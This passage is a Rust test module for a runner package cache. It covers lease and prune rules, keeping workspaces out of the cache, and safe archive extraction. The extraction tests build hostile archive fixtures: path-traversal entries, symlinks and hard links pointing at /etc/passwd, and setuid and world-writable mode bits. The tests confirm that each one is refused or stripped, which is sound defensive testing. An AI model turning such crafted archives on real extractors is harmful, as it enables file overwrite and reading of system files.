        assert!(cache.entry(&held).unwrap().is_some());
    }

    #[tokio::test]
    async fn an_unreferenced_version_prunes_with_no_ceremony() {
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;
        let held = version("2.330.0");

        cache.prune(&held, &[]).expect("nothing references it");

        assert!(cache.entry(&held).unwrap().is_none());
        assert!(cache.installed().unwrap().is_empty());
    }

    #[tokio::test]
    async fn one_attempts_lease_does_not_pin_another_version() {
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;

        // A second version, so there are two entries and one lease.
        let newer = tar_gz_bytes(&[("run.sh", "newer\n")]);
        harness.catalog.publish(vec![published(
            "linux",
            "x64",
            "2.340.0",
            ".tar.gz",
            Some(&hex_digest(&newer)),
        )]);
        harness.fetcher.serve(newer);
        harness
            .clock
            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS + 1));
        cache.ensure_installed().await.expect("the newer install");
        assert_eq!(cache.installed().unwrap().len(), 2);

        let live = attempt_in(&harness, 0x100, AttemptState::Busy);
        cache.lease(&live, &version("2.340.0")).expect("a lease");

        // The held one is refused, the unheld one is not.
        assert!(
            cache
                .prune(&version("2.340.0"), std::slice::from_ref(&live))
                .is_err()
        );
        cache
            .prune(&version("2.330.0"), &[live])
            .expect("the unheld version prunes");
        assert_eq!(cache.installed().unwrap().len(), 1);
    }

    #[tokio::test]
    async fn a_lease_outlives_the_cache_object_that_took_it() {
        // The guard is only meaningful if it survives a restart, so the lease
        // is a file rather than a field.
        let (harness, _, _) = linux_fixture();
        let held = version("2.330.0");
        let live = attempt_in(&harness, 0x100, AttemptState::Busy);
        {
            let cache = cache_with_one_entry(&harness).await;
            cache.lease(&live, &held).expect("a lease");
        }

        let reopened = harness.cache();
        assert_eq!(reopened.holders(&held).unwrap(), vec![live.id]);
        assert!(reopened.prune(&held, &[live]).is_err());
    }

    #[tokio::test]
    async fn releasing_a_lease_that_was_never_taken_is_not_an_error() {
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;
        cache
            .release(AttemptId::from_u128(0xdead))
            .expect("a cleanup path may release unconditionally");
    }

    #[tokio::test]
    async fn leasing_a_version_that_is_not_installed_is_refused() {
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;
        let attempt = attempt_in(&harness, 0x100, AttemptState::Busy);

        let error = cache.lease(&attempt, &version("9.9.9")).unwrap_err();

        assert!(matches!(error, PackageError::NotInstalled { .. }));
    }

    // =====================================================================
    // DoD 7 — job workspaces are never stored inside the package cache.
    // =====================================================================

    #[tokio::test]
    async fn a_lease_refuses_a_workspace_inside_the_cache_and_accepts_one_outside_it() {
        // Both directions in one test, deliberately.
        //
        // Split across two tests, the refusal half stayed green through a
        // mutation that made the containment check answer `true` for
        // everything — a lease that refuses every workspace satisfies "inside
        // is refused" perfectly. The acceptance half is what makes the refusal
        // mean something, and a reviewer reading one test cannot miss it the
        // way a reviewer reading two can.
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;
        let held = version("2.330.0");

        // Refused: the mistake this guard exists to catch is `e3` deriving a
        // runtime path from the cache entry it copied from.
        for inside in [
            cache.root().join("2.330.0").join("_work"),
            cache.root().join("workspaces").join("attempt-1"),
            cache.root().to_path_buf(),
        ] {
            let attempt = fixtures::attempt()
                .id(AttemptId::from_u128(0x100))
                .state(AttemptState::Busy)
                .runtime_path(inside.to_string_lossy().to_string())
                .build();

            let error = cache.lease(&attempt, &held).unwrap_err();

            assert!(
                matches!(error, PackageError::WorkspaceInsideCache { .. }),
                "`{}` is inside the cache and must be refused, got {error:?}",
                inside.display()
            );
            assert!(
                cache.holders(&held).unwrap().is_empty(),
                "a refused lease must not have been written"
            );
        }

        // Accepted: a workspace where `d1` actually puts one.
        let proper = attempt_in(&harness, 0x100, AttemptState::Busy);
        cache
            .lease(&proper, &held)
            .expect("a runtime under the runtime directory is where it belongs");
        assert_eq!(cache.holders(&held).unwrap(), vec![proper.id]);
    }

    #[test]
    fn the_runtime_directory_and_the_package_cache_are_disjoint_roots() {
        // Structural, and it holds for a layout nobody has created yet: `d1`
        // puts workspaces under `runtime/` and the retained package cache under
        // `state/`, so neither can contain the other.
        let dir = tempfile::tempdir().expect("a temporary root");
        let paths = AppPaths::rooted_at(dir.path());
        let cache_root = paths.state_dir().join(PACKAGES_DIR);
        let workspaces = paths.runtime_dir();

        assert!(
            !is_inside(&cache_root, workspaces),
            "job workspaces must not live inside the package cache"
        );
        assert!(
            !is_inside(workspaces, &cache_root),
            "the package cache must not live inside the workspace root"
        );
        // And a concrete per-attempt workspace, the shape `e3` will build.
        let attempt_workspace = workspaces
            .join(fixtures::POLICY_ID.to_string())
            .join(fixtures::ATTEMPT_ID.to_string());
        assert!(!is_inside(&cache_root, &attempt_workspace));
    }

    #[tokio::test]
    async fn installing_writes_nothing_under_the_runtime_directory() {
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;

        assert!(
            all_paths(harness.paths.runtime_dir()).is_empty(),
            "the package cache must not create job workspaces: {:?}",
            all_paths(harness.paths.runtime_dir())
        );
        // Everything it did write is under the cache root.
        let written = all_paths(cache.root());
        assert!(
            written.iter().any(|path| path.starts_with("2.330.0")),
            "the entry should be there: {written:?}"
        );
    }

    #[test]
    fn the_tool_cache_is_retained_beside_the_binaries_not_inside_an_entry() {
        // "Runner binaries and approved tool caches are retained separately
        // from job workspaces" — separately from workspaces, and separately
        // from the immutable entries, because a tool cache is written to.
        let dir = tempfile::tempdir().expect("a temporary root");
        let paths = AppPaths::rooted_at(dir.path());
        let cache = PackageCache::new(
            &paths,
            Os::Linux,
            Arch::X64,
            CachePorts {
                catalog: FakeCatalog::with(Vec::new()),
                fetcher: FakeFetcher::with(Vec::new()),
                backoff: Arc::new(NoBackoff),
                clock: Arc::new(FakeClock::default()),
            },
        );

        assert!(
            !is_inside(cache.root(), cache.tool_cache_dir()),
            "a written-to tool cache must not sit inside the immutable entries"
        );
        assert!(
            !is_inside(paths.runtime_dir(), cache.tool_cache_dir()),
            "the tool cache is retained, not disposable with a workspace"
        );
        assert!(is_inside(paths.state_dir(), cache.tool_cache_dir()));
    }

    // =====================================================================
    // Extraction
    // =====================================================================

    #[tokio::test]
    async fn both_published_archive_formats_extract_on_every_platform() {
        for (extension, bytes) in [
            (".zip", zip_bytes(&package_entries())),
            (".tar.gz", tar_gz_bytes(&package_entries())),
        ] {
            let digest = hex_digest(&bytes);
            let harness = Harness::new(
                vec![published(
                    "linux",
                    "x64",
                    "2.330.0",
                    extension,
                    Some(&digest),
                )],
                bytes,
            );

            let installed = harness
                .cache()
                .ensure_installed()
                .await
                .unwrap_or_else(|error| panic!("{extension} should extract: {error}"));

            assert_eq!(
                fs::read_to_string(installed.root().join("run.sh")).unwrap(),
                "#!/bin/sh\necho runner\n"
            );
            assert_eq!(
                fs::read_to_string(installed.root().join("bin/Runner.Listener")).unwrap(),
                "listener\n"
            );
        }
    }

    #[test]
    fn an_archive_entry_that_escapes_is_refused_and_writes_nothing_outside_the_target() {
        // This asserts a *property* — nothing lands outside the extraction
        // directory — and that property is held up by two independent layers:
        // this module's `resolve_inside`, and the archive crates' own guards
        // (`ZipFile::enclosed_name` answering `None`, `Entry::unpack_in`
        // answering `false`). Gutting either layer alone leaves the property
        // standing; removing both turns this red.
        //
        // # What that means for the call sites, stated rather than glossed
        //
        // `resolve_inside` itself is pinned by
        // `an_archive_entry_may_not_resolve_outside_the_directory_it_is_
        // extracted_into`, which reds when the function is gutted. Its two
        // **call sites** are pinned by compilation rather than by behaviour:
        // each uses the returned path as the destination it writes to or
        // applies the mode policy to, so neither can be deleted. `extract_tar_gz`
        // used to discard the result, which meant the line could be removed with
        // every test still green — that is fixed, and the fix is why the tar
        // path can apply a mode at all.
        //
        // No input distinguishes this module's layer from the archive crates'
        // layers today, so no better test can close that gap. **The layer's
        // value is insurance against a dependency changing its mind**, not
        // coverage of a reachable hole — a `zip` or `tar` release that relaxed
        // its own sanitising would be caught here rather than shipped.
        let dir = tempfile::tempdir().expect("a temporary root");
        let target = dir.path().join("target");
        let outside = dir.path().join("escaped.txt");

        // Negative control: a legitimate archive really does extract here, so a
        // refusal below is a refusal of the escape rather than of everything.
        let good = dir.path().join("good.archive");
        fs::write(&good, tar_gz_bytes(&package_entries())).unwrap();
        extract(&good, ArchiveKind::TarGz, &target).expect("a legitimate archive extracts");
        assert!(target.join("run.sh").is_file());
        fs::remove_dir_all(&target).unwrap();

        for (label, bytes, kind) in [
            (
                "tar.gz",
                tar_gz_with_raw_name("../escaped.txt", "owned"),
                ArchiveKind::TarGz,
            ),
            (
                "tar.gz absolute",
                tar_gz_with_raw_name("/tmp/escaped.txt", "owned"),
                ArchiveKind::TarGz,
            ),
            (
                "zip",
                zip_bytes(&[("../escaped.txt", "owned")]),
                ArchiveKind::Zip,
            ),
        ] {
            let archive = dir.path().join(format!("{label}.archive"));
            fs::write(&archive, &bytes).unwrap();
            let _ = fs::remove_dir_all(&target);

            let result = extract(&archive, kind, &target);

            assert!(
                !outside.exists(),
                "{label}: an entry escaped the extraction directory"
            );
            let error = result.expect_err(&format!("{label}: the escape must be refused"));
            assert!(
                matches!(error, PackageError::UnsafeArchiveEntry { .. }),
                "{label}: expected an unsafe-entry refusal, got {error:?}"
            );
            assert!(error.is_terminal());
            assert_eq!(
                error.failure_reason(),
                Some(FailureReason::RunnerPackageUnverified)
            );
        }
    }

    #[test]
    fn the_mode_policy_drops_every_bit_that_is_not_an_executable_bit() {
        // The policy itself, asserted on every CI leg including the one whose
        // filesystem has no mode bits — the `#[cfg(unix)]` tests below prove
        // the extraction paths reach this function, and this proves what the
        // function decides.
        for (published, expected, what) in [
            (0o4755, 0o700, "setuid is dropped"),
            (0o2755, 0o700, "setgid is dropped"),
            (0o1777, 0o700, "the sticky bit is dropped"),
            (
                0o7777,
                0o700,
                "all three, plus group and other, are dropped",
            ),
            (0o777, 0o700, "group and other lose everything"),
            (0o666, 0o600, "a non-executable file stays non-executable"),
            (0o644, 0o600, "the ordinary case"),
            (0o755, 0o700, "an executable stays executable"),
            (0o000, 0o600, "the owner can always read it back"),
        ] {
            assert_eq!(
                policy_mode(published),
                expected,
                "{what}: policy_mode({published:o}) should be {expected:o}"
            );
        }
        // Stated as properties too, so a policy change has to be deliberate.
        for published in 0..=0o7777_u32 {
            let applied = policy_mode(published);
            assert_eq!(applied & 0o7000, 0, "no setuid, setgid or sticky ever");
            assert_eq!(applied & 0o077, 0, "nothing for group or other ever");
            assert_eq!(
                applied & 0o100 != 0,
                published & 0o111 != 0,
                "executability is the only thing carried through, and only for \
                 the owner (published {published:o} -> {applied:o})"
            );
        }
    }

    /// `.tar.gz` is the format for Linux and macOS, so this is where modes and
    /// links actually reach a filesystem that has them.
    #[cfg(unix)]
    #[test]
    fn a_published_archives_setuid_and_group_bits_are_never_applied_to_an_extracted_file() {
        use std::os::unix::fs::PermissionsExt as _;

        let dir = tempfile::tempdir().expect("a temporary root");
        // setuid + setgid + sticky, world-writable, and executable: everything
        // a hostile or merely careless publisher could put in a header.
        let bytes = tar_gz_special(
            "run.sh",
            "#!/bin/sh\n",
            0o7777,
            tar::EntryType::Regular,
            None,
        );
        // The fixture really carries them. Without this the assertions below
        // would hold over an archive that never had a setuid bit to drop.
        let (mode, kind, _) = first_entry_header(&bytes);
        assert_eq!(mode, 0o7777, "the fixture must carry the full mode");
        assert_eq!(kind, tar::EntryType::Regular);

        let archive = dir.path().join("p.archive");
        fs::write(&archive, &bytes).unwrap();
        let target = dir.path().join("target");
        extract(&archive, ArchiveKind::TarGz, &target).expect("extraction");

        let applied = fs::metadata(target.join("run.sh"))
            .unwrap()
            .permissions()
            .mode()
            & 0o7777;
        assert_eq!(
            applied & 0o4000,
            0,
            "setuid must never survive extraction (mode {applied:o})"
        );
        assert_eq!(
            applied & 0o2000,
            0,
            "setgid must never survive extraction (mode {applied:o})"
        );
        assert_eq!(
            applied & 0o022,
            0,
            "group and world write must never survive (mode {applied:o})"
        );
        // The policy `extract_zip` documents, applied identically here:
        // executable bits kept, owner read/write, nothing else.
        assert_eq!(
            applied, 0o700,
            "the tar path must apply the same mode policy as the zip path"
        );
    }

    #[cfg(unix)]
    #[test]
    fn an_extracted_directorys_mode_is_owner_only_and_still_usable() {
        use std::os::unix::fs::PermissionsExt as _;

        let dir = tempfile::tempdir().expect("a temporary root");
        let bytes = tar_gz_special("bin/", "", 0o2777, tar::EntryType::Directory, None);
        let archive = dir.path().join("p.archive");
        fs::write(&archive, &bytes).unwrap();
        let target = dir.path().join("target");

        extract(&archive, ArchiveKind::TarGz, &target).expect("extraction");

        let applied = fs::metadata(target.join("bin"))
            .unwrap()
            .permissions()
            .mode()
            & 0o7777;
        assert_eq!(
            applied & 0o2000,
            0,
            "setgid must not survive on a directory"
        );
        assert_eq!(applied & 0o077, 0, "group and other get nothing");
        assert!(
            applied & 0o300 == 0o300,
            "the owner must still be able to write and traverse it (mode {applied:o})"
        );
    }

    #[test]
    fn a_link_whose_target_escapes_the_package_is_refused() {
        // Refused before any filesystem link call, so this runs on every CI
        // leg — creating a symlink on Windows needs a privilege the agent
        // should not want, and this test never needs one.
        let dir = tempfile::tempdir().expect("a temporary root");
        for (label, bytes) in [
            (
                "symlink to an absolute path",
                tar_gz_special(
                    "link",
                    "",
                    0o777,
                    tar::EntryType::Symlink,
                    Some("/etc/passwd"),
                ),
            ),
            (
                "symlink climbing out",
                tar_gz_special(
                    "link",
                    "",
                    0o777,
                    tar::EntryType::Symlink,
                    Some("../../escape"),
                ),
            ),
            (
                "symlink climbing out from a subdirectory",
                tar_gz_special(
                    "bin/link",
                    "",
                    0o777,
                    tar::EntryType::Symlink,
                    Some("../../escape"),
                ),
            ),
            (
                "hard link",
                tar_gz_special("link", "", 0o644, tar::EntryType::Link, Some("/etc/passwd")),
            ),
        ] {
            // The fixture really is a link with that target.
            let (_, kind, link) = first_entry_header(&bytes);
            assert!(
                matches!(kind, tar::EntryType::Symlink | tar::EntryType::Link),
                "{label}: the fixture must be a link entry"
            );
            assert!(link.is_some(), "{label}: the fixture must carry a target");

            let archive = dir.path().join(format!("{label}.archive"));
            fs::write(&archive, &bytes).unwrap();
            let target = dir.path().join(label);

            let error = extract(&archive, ArchiveKind::TarGz, &target)
                .expect_err(&format!("{label} must be refused"));

            assert!(
                matches!(error, PackageError::UnsafeArchiveEntry { .. }),
                "{label}: expected an unsafe-entry refusal, got {error:?}"
            );
            assert!(error.is_terminal());
            assert_eq!(
                error.failure_reason(),
                Some(FailureReason::RunnerPackageUnverified)
            );
            assert!(
                !target.join("link").exists(),
                "{label}: nothing may have been created"
            );
        }
    }

    /// The negative control for the refusal above: a link that stays inside the
    /// package is legitimate and must still extract.
    ///
    /// Unix-only because creating the symlink is the point, and Windows needs a
    /// privilege for that. The *refusal* path above is cross-platform.
    #[cfg(unix)]
    #[test]
    fn a_link_that_stays_inside_the_package_is_extracted() {
        let dir = tempfile::tempdir().expect("a temporary root");
        let bytes = tar_gz_special(
            "bin/current",
            "",
            0o777,
            tar::EntryType::Symlink,
            Some("../run.sh"),
        );
        let archive = dir.path().join("p.archive");
        fs::write(&archive, &bytes).unwrap();
        let target = dir.path().join("target");

        extract(&archive, ArchiveKind::TarGz, &target)
            .expect("a link inside the package is legitimate");

        assert!(
            fs::symlink_metadata(target.join("bin/current"))
                .unwrap()
                .is_symlink(),
            "the link should have been created"
        );
    }

    #[test]
    fn the_archive_format_comes_from_the_filename_not_from_the_host() {
        assert_eq!(
            ArchiveKind::split("actions-runner-win-x64-2.330.0.zip")
                .unwrap()
                .1,
            ArchiveKind::Zip
        );
        assert_eq!(
            ArchiveKind::split("actions-runner-linux-x64-2.330.0.tar.gz")
                .unwrap()
                .1,
            ArchiveKind::TarGz
        );
        assert_eq!(
            ArchiveKind::split("actions-runner-linux-x64-2.330.0.TAR.GZ")
                .unwrap()
                .1,
            ArchiveKind::TarGz
        );
        assert!(ArchiveKind::split("actions-runner-linux-x64-2.330.0.7z").is_err());
    }

    #[tokio::test]
    async fn a_zip_is_extracted_on_a_host_whose_own_packages_are_tarballs() {
        // The format follows the filename, so this exercises the Windows
        // extraction path on the Linux and macOS CI legs too.
        let bytes = zip_bytes(&package_entries());
        let harness = Harness::new(
            vec![published(
                "linux",
                "x64",
                "2.330.0",
                ".zip",
                Some(&hex_digest(&bytes)),
            )],
            bytes,
        );

        let installed = harness.cache().ensure_installed().await.expect("a zip");

        assert!(installed.root().join("bin/Runner.Listener").is_file());
    }
}
